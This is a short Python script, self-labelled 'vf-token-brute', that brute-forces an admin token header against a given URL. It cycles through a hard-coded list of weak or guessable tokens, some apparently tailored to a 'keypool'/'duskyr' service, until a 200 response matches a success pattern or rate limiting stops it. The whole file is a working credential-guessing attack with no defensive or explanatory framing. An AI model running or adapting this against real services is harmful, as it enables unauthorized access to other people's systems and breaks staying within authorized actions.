import urllib.request, urllib.error, time, json, ssl

def run(url=None, header="X-Admin-Token", candidates=None, delay_ms=120, success_pattern="counts", **kw):
    ctx = ssl.create_default_context()
    if isinstance(candidates, str):
        candidates = [c.strip() for c in candidates.split(",") if c.strip()]
    if not candidates:
        candidates = ["admin","keypool","keypool-admin","keypool_admin","secret","test","changeme","password","letmein","admin123","root","toor","dev","staging","prod","production","apikey","api-key","duskyr","duskyr-admin","superadmin","00000000","12345678","deadbeef","cafebabe","aaaaaaaa","iloveyou","qwerty","keypool123","admin@keypool","s3cr3t","hunter2","openai","router","pool-admin"]
    results = []
    found = None
    for i, tok in enumerate(candidates):
        req = urllib.request.Request(url, headers={header: tok, "User-Agent": "vf-token-brute/1.0"})
        try:
            with urllib.request.urlopen(req, timeout=15, context=ctx) as r:
                body = r.read(2000).decode("utf-8", "replace")
                status = r.status
        except urllib.error.HTTPError as e:
            body = e.read(500).decode("utf-8", "replace")
            status = e.code
        except Exception as e:
            results.append({"tok": tok, "err": str(e)[:60]})
            continue
        results.append({"tok": tok, "status": status, "len": len(body)})
        if status == 200 and (success_pattern in body or success_pattern == "*"):
            found = tok
            break
        if status == 429:
            results.append({"note": "rate-limited at candidate %d" % i})
            break
        time.sleep(delay_ms / 1000.0)
    return json.dumps({"tried": len(results), "found": found, "last": results[-3:] if results else []})

